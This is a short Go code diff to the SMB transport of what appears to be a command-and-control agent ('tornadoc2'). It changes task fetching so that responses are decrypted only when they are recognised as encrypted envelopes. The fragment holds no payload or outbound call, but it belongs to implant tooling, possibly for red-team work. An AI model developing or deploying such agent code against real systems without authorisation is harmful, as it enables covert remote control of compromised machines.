@@ -15,7 +15,7 @@ import (
 	"time"
 
 	"golang.org/x/sys/windows"
-
+	"tornadoc2/agent/crypto"
 	"tornadoc2/agent/features"
 	"tornadoc2/agent/internal/pivot"
 	"tornadoc2/agent/protocol"
@@ -452,7 +452,7 @@ func (t *smbTransport) FetchTasks(wire *WireSession) ([]Task, error) {
 	}
 	body := []byte(env.Body)
 
-	if wire != nil {
+	if wire != nil && crypto.IsEnvelope(body) {
 		plain, wasEnc, derr := wire.DecryptResponse(body)
 		if derr != nil {
 			return nil, fmt.Errorf("decrypt: %w", derr)
